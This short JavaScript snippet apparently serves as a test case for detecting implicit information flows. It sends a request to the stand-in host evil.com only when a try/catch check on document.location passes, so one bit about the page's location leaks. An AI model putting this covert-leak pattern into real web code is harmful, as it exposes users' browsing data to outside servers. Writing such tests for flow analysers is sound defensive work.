var TopString = (45).toString(12);
document.location.href = TopString;

var x = new XMLHttpRequest();
x.open("GET", "http://evil.com");

function foo() {
	x.send(null);	
}

try {
	if (document.location.href != "hush-hush.com") 
		throw "irrelevant";
	foo();
} catch (_) {};
